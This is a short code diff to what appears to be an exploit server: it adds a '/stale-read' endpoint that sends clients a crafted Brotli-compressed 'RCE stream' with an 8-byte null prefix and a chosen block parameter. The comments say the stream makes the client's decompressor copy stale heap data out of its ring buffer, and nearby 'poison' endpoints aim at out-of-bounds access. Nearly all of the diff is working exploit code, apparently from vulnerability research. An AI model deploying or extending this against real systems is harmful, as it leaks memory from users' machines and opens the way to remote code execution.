@@ -804,6 +804,18 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
 
             _send_br_response(ssl_sock, payload)
 
+        # --- Stale data leak endpoint ---
+        elif path == "/stale-read":
+            # Minimal-prefix RCE stream that reads from stale ring buffer data.
+            # With a tiny prefix (8 bytes), the copy distance is small,
+            # so copies read from early ring buffer positions — likely
+            # containing stale heap data from previous allocations.
+            # cbe=0x003F0F gives block_length=32768 for deterministic behavior.
+            prefix = b"\x00" * 8
+            payload = build_rce_stream(prefix, 0x003F0F)
+            print(f"  -> STALE-READ: 8B null prefix, cbe=0x003F0F, total={len(payload)}B")
+            _send_br_response(ssl_sock, payload)
+
         # --- Optimized poison endpoints (small CBE for deterministic OOB) ---
         elif path.startswith("/poison/"):
             parts = path.split("/")
